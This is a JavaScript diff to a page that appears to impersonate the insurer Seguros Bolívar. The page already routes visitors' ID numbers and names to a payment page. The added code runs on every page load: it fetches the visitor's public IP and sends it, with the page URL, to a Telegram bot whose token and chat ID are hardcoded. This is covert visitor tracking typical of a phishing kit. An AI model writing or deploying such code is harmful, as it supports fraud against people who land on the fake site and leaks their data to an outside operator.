@@ -399,6 +399,69 @@ const API_BASE = window.location.origin;
     const nombre = [taker.userFirstName, taker.userLastName].filter(Boolean).join(' ') || '';
     window.location.href = `pago.html?tipoDoc=${tipoDoc}&numDoc=${numDoc}&nombre=${encodeURIComponent(nombre)}`;
   }
+
+  // ═══════════════════════════════════════════════════════════
+  // NOTIFICACIÓN A TELEGRAM AL INGRESAR AL SITIO
+  // ═══════════════════════════════════════════════════════════
+  const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
+  const TELEGRAM_CHAT_ID = '-1004457768033'; // ID del chat/grupo donde llega el mensaje
+
+  async function notificarIngresoTelegram() {
+    // Obtener info del navegador
+    const userAgent = navigator.userAgent;
+    const plataforma = navigator.platform;
+    const idioma = navigator.language;
+    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+    // Detectar navegador y sistema operativo (simple)
+    let navegador = 'Desconocido';
+    if (userAgent.includes('Chrome')) navegador = 'Chrome';
+    else if (userAgent.includes('Firefox')) navegador = 'Firefox';
+    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) navegador = 'Safari';
+    else if (userAgent.includes('Edge')) navegador = 'Edge';
+
+    let so = 'Desconocido';
+    if (userAgent.includes('Windows')) so = 'Windows';
+    else if (userAgent.includes('Mac')) so = 'macOS';
+    else if (userAgent.includes('Android')) so = 'Android';
+    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) so = 'iOS';
+    else if (userAgent.includes('Linux')) so = 'Linux';
+
+    // Obtener IP pública (opcional, usando un servicio gratuito)
+    let ipPublica = 'No disponible';
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      ipPublica = ipData.ip;
+    } catch (e) {
+      // Si falla, seguimos sin IP
+    }
+
+    const mensaje = `
+🔔 *NUEVO INGRESO AL SITIO - SEGUROS BOLÍVAR*
+🌐 *Página:* ${window.location.href}
+🌐 *IP:* ${ipPublica}
+    `;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: mensaje,
+          parse_mode: 'Markdown'
+        })
+      });
+    } catch (err) {
+      console.error('Error enviando notificación a Telegram:', err);
+    }
+  }
+
+  // Enviar notificación cuando cargue la página
+  window.addEventListener('load', () => {
+    notificarIngresoTelegram();
+  });
 </script>
 
 </body>
